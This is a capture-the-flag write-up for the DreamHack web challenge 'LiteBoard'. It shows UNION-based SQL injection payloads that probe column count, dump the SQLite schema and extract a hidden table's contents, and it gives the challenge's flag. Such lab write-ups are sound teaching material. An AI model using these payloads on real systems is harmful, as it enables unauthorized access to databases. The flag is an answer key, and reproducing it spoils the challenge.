# LiteBoard — DreamHack

> **Room / Challenge:** LiteBoard (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** LiteBoard (web)
- **Link**: `https://dreamhack.io/wargame/challenges/1689`
- **Level:** `2`
- **Date:** `24-11-2025`

---

## Goal

Leveraging SQL Injection to explore the database and get the flag.

## My Solution

The app hasn't given any source code, therefore I had to try several payloads. Initially, I tried SSTI but got nothing but then I came to a breakthrough, submit `'` to the search input got `Internal Server Error`, therefore the app may be vulnerable to SQL Injection. Tried payload:

```
' UNION SELECT 'a', 'b' --
```

This payload tells us that the server is selecting 2 columns, since this payload doesn't return error. Now explore how tables are created:

```
' UNION SELECT '1', sql FROM sqlite_master --
```

Got:

```sql
CREATE TABLE README (hello TEXT,light TEXT,world TEXT)
CREATE TABLE posts (id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT)
CREATE TABLE sqlite_sequence(name,seq)
```

Suspicious `README` tables, let's select rows in this table:

```
' UNION SELECT '1', hello || ' ' || light || ' ' || world FROM README --
```

Got: `1s_5qL1t bisc2024{7H1s_ 3_b04rd}`. This may be the flag. I tried submitting different variants and got the correct flag:

```
bisc2024{7H1s_1s_5qL1t3_b04rd}
```
